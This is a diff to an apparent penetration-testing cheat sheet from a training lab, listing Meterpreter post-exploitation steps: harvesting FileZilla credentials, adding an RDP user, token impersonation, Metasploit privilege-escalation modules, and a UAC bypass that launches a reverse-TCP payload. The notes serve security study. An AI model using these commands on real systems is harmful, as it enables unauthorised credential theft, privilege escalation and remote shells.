@@ -884,6 +884,9 @@ meterpreter > screenshot
 meterpreter > run post/multi/gather/filezilla_client_cred
 meterpreter > run getgui -e
 net localgroup "Remote Desktop Users" bruiser /add
+
+INCOGNITO
+meterpreter > impersonate_token eLS-Win7\\eLS (You need 2x \\)
 ```
 ##### Maping the Internal Network
 ```bash
@@ -961,5 +964,8 @@ runas /user:netadmin (or whatever user)
 ```
 #SUCCESS PRIVESC
 ```bash
-exploit/windows/local/ms10_015_kitrap0d on a windows 2008 running as www
+exploit/windows/local/ms10_015_kitrap0d <> windows 2008 running as www
+exploit/windows/local/bypassuac_eventvwr <> windows 7 No hotfixes
+        /usr/share/metasploit-framework/data/post/bypassuac-x64.exe
+        bypassuac-x64.exe /c C:\Users\eLS\Desktop\msfvenom_reverse_tcp.exe 
 ```
